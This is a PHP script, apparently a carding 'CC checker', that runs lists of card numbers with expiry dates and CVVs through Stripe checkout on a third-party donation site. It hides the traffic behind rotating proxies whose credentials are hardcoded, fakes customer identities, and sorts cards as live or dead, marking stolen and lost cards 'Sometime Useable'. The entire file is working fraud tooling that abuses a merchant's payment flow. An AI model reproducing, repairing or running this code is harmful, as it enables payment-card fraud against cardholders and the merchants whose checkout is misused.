<?php
/////////////////====== Made with ❤️ by AndryMata ===============\\\\\\\\\\\\\\\\\\\\\


/////Site https://libofebooks.com/donate.php
//Toca recordarme para actualizar el api.
include 'function.php';

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
if(file_exists(getcwd().('/cookie.txt'))){
@unlink('cookie.txt');
}


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function proxys()
{
  $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps[$myproxy];
  return $poxyHttps;
}
$proxy = proxys(); 
//$ip = multiexplode(array(":", "|", ""), $proxy)[0]; 
//echo '[ IP: '.$ip.' ] ';


////////////////////////////===[Randomizing Details 

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email1 = $matches1[1][0];
$serve_arr = array("gmail.com","hotmail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email1);
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////



$Websharegay = rand(0,10);

$rp1 = array(
  1 => 'evlolols-rotate:uey6dqf81eq4',
  2 => 'evlolols-'.$Websharegay.':uey6dqf81eq4',
  3 => 'mxbftvud-rotate:n9u16fdwchpd',
  4 => 'mxbftvud-'.$Websharegay.':n9u16fdwchpd',
  5 => 'vwfznjto-rotate:lps8m9aqvm8c',
  6 => 'vwfznjto-'.$Websharegay.':lps8m9aqvm8c',
  7 => 'egkmkurd-rotate:iz1x4ycmjt8i',
  8 => 'egkmkurd-'.$Websharegay.':iz1x4ycmjt8i',
  9 => 'egwzatit-rotate:ygqp0ilpvbit',
  10 =>'egwzatit-'.$Websharegay.':ygqp0ilpvbit',
  11 =>'qfuyjjnf-rotate:rzcb7e75kt8f',
  12 =>'qfuyjjnf-'.$Websharegay.':rzcb7e75kt8f',
  13 =>'fvouhazj-rotate:h88p6ngfe0h9',
  14 =>'fvouhazj-'.$Websharegay.':h88p6ngfe0h9',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];



////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
//$ip = $ip1;
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

echo '[ IP: '.$ip.' ] ';

///////////////////////==============[End Proxy Section]===============//////////////////////////////
//////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.stripe.com/api/bootstrap?key=pk_live_51HDbNjBj3rTUwR4SozL2UAtvwXInV2sqm08BALuhifI4MVKe7eO40kT8Ds6gVbj4BG83qKplJiwXjo47QdVVTNyl00YxG7EKco&locale=es-ES');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: checkout.stripe.com',
'accept: */*',
//'accept-encoding: gzip, deflate, br',
'accept-language: es-ES,es;q=0.9,en;q=0.8',
'referer: https://checkout.stripe.com/m/v3/index-a70c0660af7733905cda71dd6f01a2dc.html?distinct_id=6c7e1824-2298-8476-b388-4039c2157906',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//curl_setopt($ch, CURLOPT_POSTFIELDS, '....');
$result3 = curl_exec($ch);

$tokens = trim(strip_tags(getstr($result3,'"securityToken":"','"')));
$sid1 = trim(strip_tags(getstr($result3,'"sessionID":"','"')));
curl_close($ch);
//////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: es-ES',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-a70c0660af7733905cda71dd6f01a2dc.html?distinct_id=6c7e1824-2298-8476-b388-4039c2157906',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: '.$ua.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F6c4e062)&referrer=https%3A%2F%2Flibofebooks.com%2Fdonate.php&pasted_fields=number&key=pk_live_4aL9ZBJ3JfYjXueQs1O89xm8&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&card[address_zip]=10080&time_on_page=223617&guid=NA&muid=NA&sid=NA');
$result1 = curl_exec($ch);

$token = trim(strip_tags(getstr($result1,'"id": "','"')));
curl_close($ch);
//////////////=[2nd Req]=//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://checkout.stripe.com/api/account');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: checkout.stripe.com',
'accept: */*',
'accept-language: es-ES,es;q=0.9,en;q=0.8',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-a70c0660af7733905cda71dd6f01a2dc.html?distinct_id=6c7e1824-2298-8476-b388-4039c2157906',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua.'',
'x-csrf-token: '.$tokens.'',
'x-rack-session: '.$sid1.'',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'email='.$email.'&validation_type=card&payment_user_agent=Stripe%20Checkout%20v3%20checkout-manhattan%20(stripe.js%2F6c4e062)&referrer=https%3A%2F%2Flibofebooks.com%2Fdonate.php&pasted_fields=number&key=pk_live_51HDbNjBj3rTUwR4SozL2UAtvwXInV2sqm08BALuhifI4MVKe7eO40kT8Ds6gVbj4BG83qKplJiwXjo47QdVVTNyl00YxG7EKco&card=&time_on_page=223617&guid=NA&muid=NA&sid=NA&merchant_name=libofebooks.com&remember_me=true&phone='.$phone.'&token='.$token.'&locale=es-ES');
  $result2 = curl_exec($ch);
curl_close($ch);


 


/////////// [Bin Lookup Api] /////////////

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);


      
      
/////////////////[Responses]///////////////

if(strpos($result2, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "pass",')){
    echo '<span class="badge badge-white">#Aprovada </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b></br> <span class="badge badge-white">『 DEVIL VINAY 』</span></br>';
}
elseif(strpos($result2,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 DEVIL VINAY 』</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "Thank You." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 DEVIL VINAY 』</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"status": "succeeded"')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 DEVIL VINAY 』 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_zip" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 DEVIL VINAY 』  )」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "Success" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "s1ucceeded." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Insufficient Funds  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "insufficient_funds")) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Insufficient Funds  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Lost_Card - Sometime Useable  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "stolen_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Stolen_Card - Sometime Useable  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
elseif(strpos($result2, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Pickup Card (Reported Stolen Or Lost) 『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 DEVIL VINAY 』  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 DEVIL VINAY 』 ♛  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Pickup Card (Reported Stolen Or Lost) 『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Incorrect Card Number  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_number")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Incorrect Card Number  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2, "do_not_honor")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Do_Not_Honor  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Card Declined  『 DEVIL VINAY 』 ♛  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Card Declined  『 DEVIL VINAY 』 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Card Declined  『 DEVIL VINAY 』 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Security Code Check : Unavailable [Proxy Dead/change IP]  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Security Code Check : Unavailable [Proxy Dead/change IP]  『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Missing Card Details 『 DEVIL VINAY 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result2,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif (strpos($result1,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 1  『 DEVIL VINAY 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 『 DEVIL VINAY 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 『 DEVIL VINAY 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★3D Secure Redirect 『 DEVIL VINAY 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"missing_payment_information")){
     '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Missing Payment Informations 『 DEVIL VINAY 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Credit Card Number_Andry【★яσуαℓ★】  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Dead Proxy/Error Not listed 『 DEVIL VINAY 』   」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
curl_close($ch);
ob_flush();
//echo "<b>1REQ Result:</b> $result1<br><br>";
echo "<b>2REQ Result:</b> $result2<br><br>";
//echo "<b>3REQ Result:</b> $result2<br><br>";


/////////////////====== Hecho con ❤️ por AndryMata ===============\\\\\\\\\\\\\\\\\\\\\

?>

